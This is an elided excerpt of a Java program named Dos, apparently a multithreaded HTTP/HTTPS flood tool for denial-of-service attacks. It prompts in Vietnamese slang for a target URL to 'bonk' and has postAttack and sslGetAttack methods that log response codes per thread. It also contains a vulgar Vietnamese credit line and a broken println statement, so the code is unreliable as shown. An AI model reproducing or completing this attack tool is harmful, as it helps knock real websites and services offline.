...
public class Dos implements Runnable {
    ...
    public static void main(String[] args) throws Exception {
        ...
        System.out.print("ỦL cần Bonk");
        url = in.nextLine();
        System.out.println("\n");
        System.out.println("Thử thách 6p6s gõ web, gét gô!!: " + url);
        ...
        System.out.println("Recode + rename by: ĐỊT MẸ EM LINH:3");
        ...
        System.out.println("đang tìm gậy...");
    ...
    private void postAttack(String url) throws Exception {
        ...
        wr.close();
        int responseCode = con.getResponseCode();
        System.out.println("bonk": " + responseCode + "Thread: " + this.seq);
    }
    ...
    private void sslGetAttack(String url) throws Exception {
        ...
        int responseCode = con.getResponseCode();
        System.out.println(": " + responseCode + "Thread: " + this.seq);
    }
}
